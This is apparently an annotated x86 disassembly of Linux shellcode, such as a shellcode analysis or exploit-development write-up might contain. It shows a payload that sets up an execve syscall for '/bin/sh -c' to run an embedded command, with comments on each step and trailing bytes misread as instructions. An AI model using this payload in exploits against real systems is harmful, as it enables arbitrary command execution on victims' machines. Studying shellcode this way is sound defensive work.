push   0xb            ; move 0xb onto the stack
pop    eax            ; move 0xb into eax 
cdq                   
push   edx            ; moving 0x00 onto stack
pushw  0x632d         ; pushing "-c" to the stack
mov    edi,esp        ; moving pointer to "-c" into edi
push   0x68732f       
push   0x6e69622f     ; moving "/bin/sh -c" to stack
mov    ebx,esp        ; moving pointer to "/bin/sh -c" to ebx
push   edx
call   0x56559060 <code+32>
imul   esp,DWORD PTR [eax+eax*1+0x57],0xcde18953
add    BYTE PTR [eax],0x0
